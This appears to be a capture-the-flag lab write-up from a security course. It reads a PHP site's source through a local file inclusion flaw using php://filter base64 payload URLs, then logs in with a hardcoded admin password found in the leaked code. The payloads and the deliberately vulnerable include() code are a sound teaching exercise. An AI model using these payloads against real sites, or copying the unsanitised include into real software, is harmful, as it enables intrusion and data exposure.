---
title: Simple Web 0x08(Lab - My First Meow Website)
tags: [NTUSTWS, CTF, Web]

category: "Security Course｜NTUST WS｜LFI"
date: 2023-01-31
---

# Simple Web 0x08(Lab - My First Meow Website)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
* Challenge: http://h4ck3r.quest:8400/
* Target: Login as Admin

## Background
* [PHP 偽協議 (一) ](https://ithelp.ithome.com.tw/articles/10245020)
* [Web Security 0x1](https://youtu.be/_hasOTGximc?t=2855)

## Exploit
1. Observe: According to the URL, `http://h4ck3r.quest:8400/?page=inc/home`, it might have `LFI` problem.
2. Use `php://filter` to read page
    * `http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home`
    
    source code
    ```php
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Meow</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css">
    </head>

    <body>
        <nav class="navbar is-dark" role="navigation" aria-label="main navigation">
            <div class="navbar-brand">
                <a class="navbar-item" href="/?page=inc/home">🐱</a>
            </div>

            <div id="navbarBasicExample" class="navbar-menu">
                <div class="navbar-start">
                    <a class="navbar-item" href="/?page=inc/home">
                        Home
                    </a>
                    <a class="navbar-item" href="/?page=inc/about">
                        About
                    </a>
                    <a class="navbar-item" href="/admin.php">
                        Admin
                    </a>
                </div>
            </div>
        </nav>

        <div class="container" style="margin-top: 1em;">
            <?php
            if (isset($_GET['page']))
                include($_GET['page'] . ".php");
            else
                include("inc/home.php");
            ?>
        </div>
    </body>

    </html>
    ```
3. Observe page source code: We know that `admin.php` is under `/` directory.
    * `http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin`

    ```php
    <h1>Admin Panel</h1>
    <form>
        <input type="text" name="username" value="admin">
        <input type="password" name="password">
        <input type="submit" value="Submit">
    </form>

    <?php
    $admin_account = array("username" => "admin", "password" => "kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ");
    if (
        isset($_GET['username']) && isset($_GET['password']) &&
        $_GET['username'] === $admin_account['username'] && $_GET['password'] === $admin_account['password']
    ) {
        echo "<h1>LOGIN SUCCESS!</h1><p>".getenv('FLAG')."</p>";
    }

    ?>
    ```
4. Then we get admin password is: `kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ`. Then we got flag!!!